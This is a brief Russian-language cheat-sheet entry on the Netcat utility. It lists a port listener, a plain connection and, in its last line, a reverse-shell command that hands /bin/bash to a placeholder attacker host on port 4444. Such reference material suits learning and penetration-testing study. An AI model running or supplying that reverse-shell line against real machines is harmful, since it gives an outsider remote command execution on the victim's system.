# Netcat (nc)

## Описание
Утилита для работы с сетью: прослушка портов, установка соединений, настройка reverse shell для получения удаленного доступа.

## Уровень
Средний

## Примеры использования
- Прослушка порта: `nc -lvnp 4444`
- Подключение к серверу: `nc target.com 80`
- Reverse shell: `nc -e /bin/bash attacker.com 4444`
